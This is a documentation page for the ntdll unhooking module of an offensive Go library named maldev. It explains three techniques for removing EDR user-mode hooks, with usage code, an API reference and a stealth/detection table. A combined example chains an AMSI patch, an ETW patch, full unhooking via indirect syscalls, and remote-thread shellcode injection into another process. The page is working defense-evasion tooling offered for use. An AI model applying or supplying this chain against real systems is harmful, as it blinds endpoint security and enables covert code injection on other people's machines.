---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# ntdll Unhooking

> **MITRE ATT&CK:** T1562.001 -- Impair Defenses: Disable or Modify Tools | **D3FEND:** D3-HBPI -- Hook-Based Process Instrumentation | **Detection:** High

## Primer

When a security guard is worried about a specific door, they install a tripwire across it. Anyone who walks through triggers an alarm, and the guard knows exactly who passed and when. The door still works normally -- it just has an invisible wire that reports activity.

EDR products do the same thing to Windows API functions. When your process starts, the EDR modifies the first few bytes of critical functions in `ntdll.dll` (the lowest-level user-mode library) to redirect them through the EDR's own monitoring code. This is called "hooking." When you call `NtAllocateVirtualMemory`, the hook intercepts the call, logs it, decides whether to allow it, and then either passes it through to the real function or blocks it.

Unhooking is finding the original blueprints for the door (the clean `ntdll.dll` from disk or from another process) and rebuilding the door without the tripwire. Once the hooks are removed, your API calls go directly to the kernel without EDR interception.

maldev provides three unhooking methods with increasing sophistication:

1. **Classic** -- Restore just the first 5 bytes of a specific function from the on-disk copy.
2. **Full** -- Replace the entire `.text` section of ntdll from the disk copy, removing ALL hooks at once.
3. **Perun** -- Read a pristine ntdll from a freshly-spawned suspended process (avoids reading from disk entirely).

## How It Works

```mermaid
flowchart TD
    subgraph Classic["Classic Unhook"]
        C1[Read ntdll.dll from disk] --> C2[Parse PE exports]
        C2 --> C3[Find target function offset]
        C3 --> C4[Read first 5 clean bytes]
        C4 --> C5[Overwrite hooked bytes in memory]
    end

    subgraph Full["Full Unhook"]
        F1[Read ntdll.dll from disk] --> F2[Parse PE sections]
        F2 --> F3[Extract entire .text section]
        F3 --> F4[VirtualProtect .text → RWX]
        F4 --> F5[Overwrite entire .text in memory]
        F5 --> F6[Restore .text protection]
    end

    subgraph Perun["Perun Unhook"]
        P1[CreateProcess notepad.exe SUSPENDED] --> P2[Read child's ntdll .text via ReadProcessMemory]
        P2 --> P3[Overwrite our .text with child's clean copy]
        P3 --> P4[TerminateProcess child]
    end

    style C5 fill:#2d5016,color:#fff
    style F5 fill:#2d5016,color:#fff
    style P3 fill:#2d5016,color:#fff
```

**Classic Unhook** -- Targeted, surgical:
1. Read `ntdll.dll` from `System32` on disk (never hooked).
2. Parse the PE export directory to find the target function's file offset.
3. Read the first 5 bytes (the typical hook trampoline size).
4. Overwrite the hooked in-memory bytes with the clean disk copy via `PatchMemoryWithCaller`.

**Full Unhook** -- Scorched earth:
1. Read `ntdll.dll` from disk and parse the PE to find the `.text` section.
2. Extract the entire `.text` section bytes.
3. `VirtualProtect` the in-memory `.text` to `PAGE_EXECUTE_READWRITE`.
4. `WriteProcessMemory` (or `NtWriteVirtualMemory` via Caller) to overwrite the entire section.
5. Restore original protection.

**Perun Unhook** -- Disk-free:
1. Spawn `notepad.exe` (or configurable target) in `CREATE_SUSPENDED | CREATE_NO_WINDOW` state.
2. ntdll is loaded at the same base address in all processes (ASLR is per-boot). Read the child's pristine `.text` via `ReadProcessMemory`.
3. Overwrite the local hooked `.text` with the clean copy.
4. Terminate the child process.

## Usage

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/evasion/unhook"
)

func main() {
    // Classic: unhook a single function. 3rd arg is an optional
    // stealthopen.Opener — nil = path-based read of ntdll.dll; pass a
    // *stealthopen.Stealth to bypass path-based EDR hooks on that open.
    if err := unhook.ClassicUnhook("NtAllocateVirtualMemory", nil, nil); err != nil {
        log.Fatal(err)
    }

    // Full: unhook ALL ntdll functions at once. Same Opener semantics.
    if err := unhook.FullUnhook(nil, nil); err != nil {
        log.Fatal(err)
    }

    // Perun: unhook from a child process (no disk read).
    if err := unhook.PerunUnhook(nil); err != nil {
        log.Fatal(err)
    }

    // Perun with custom host process.
    if err := unhook.PerunUnhookTarget("svchost.exe", nil); err != nil {
        log.Fatal(err)
    }
}
```

## Combined Example

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/evasion/unhook"
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
    shellcode := []byte{0x90, 0x90, 0xCC}

    // Use indirect syscalls for the unhooking itself.
    caller := wsyscall.New(wsyscall.MethodIndirect,
        wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()))

    // Layer evasion: blind telemetry first, THEN unhook.
    // Order matters: ETW patch prevents logging of the unhook operation.
    techniques := []evasion.Technique{
        amsi.ScanBufferPatch(),
        etw.All(),
        unhook.Full(),  // or unhook.CommonClassic()... for selective
    }
    if errs := evasion.ApplyAll(techniques, caller); errs != nil {
        for name, err := range errs {
            log.Printf("%s: %v", name, err)
        }
    }

    // After unhooking, all NT calls go directly to kernel.
    injector, err := inject.Build().
        Method(inject.MethodCreateRemoteThread).
        TargetPID(1234).
        Create()
    if err != nil {
        log.Fatal(err)
    }
    injector.Inject(shellcode)
}
```

## Advantages & Limitations

| Aspect | Detail |
|--------|--------|
| Stealth (Classic) | Medium -- only touches one function. Minimal disk I/O. |
| Stealth (Full) | Low -- reads entire ntdll from disk, massive memory write. Very visible. |
| Stealth (Perun) | Medium-High -- no disk read, but spawning a child process is logged. |
| Effectiveness | High -- completely removes userland hooks. After unhooking, EDR loses visibility into hooked APIs. |
| Caller routing | All three methods support `*wsyscall.Caller` for the protection/write phase, bypassing potential hooks on VirtualProtect and WriteProcessMemory themselves. |
| Detection vectors | Disk read of ntdll.dll (Full/Classic), child process spawn (Perun), memory integrity checks before/after, ETW events for VirtualProtect on ntdll pages. |
| Limitations | Does not affect kernel-level hooks (minifilters, callbacks). Does not remove hooks set after the unhook operation. Some EDRs re-hook periodically. |

## API Reference

```go
// ClassicUnhook restores the first 5 bytes of a hooked ntdll function.
// opener is optional (nil = plain os.Open of ntdll.dll). Pass a
// *stealthopen.Stealth built for ntdll.dll to bypass path-based EDR
// hooks on the CreateFile for System32\ntdll.dll.
func ClassicUnhook(funcName string, caller *wsyscall.Caller, opener stealthopen.Opener) error

// FullUnhook replaces the entire .text section from disk. Same opener
// semantics as ClassicUnhook.
func FullUnhook(caller *wsyscall.Caller, opener stealthopen.Opener) error

// PerunUnhook reads pristine ntdll from a suspended notepad.exe child.
func PerunUnhook(caller *wsyscall.Caller) error

// PerunUnhookTarget uses a custom host process.
func PerunUnhookTarget(target string, caller *wsyscall.Caller) error

// Technique constructors:
func Classic(funcName string) evasion.Technique
func CommonClassic() []evasion.Technique  // common hooked functions
func Full() evasion.Technique
func Perun() evasion.Technique

// Hook detection:
func IsHooked(funcName string) (bool, error)
```

## See also

- [Evasion area README](README.md)
- [`evasion/hook`](inline-hook.md) — symmetric primitive: install your own hooks once EDR's are removed
- [`evasion/preset`](preset.md) — Stealth preset includes `unhook.FullUnhook` as the first step
- [`win/syscall`](../syscalls/direct-indirect.md) — direct/indirect syscalls bypass hooks without restoring them
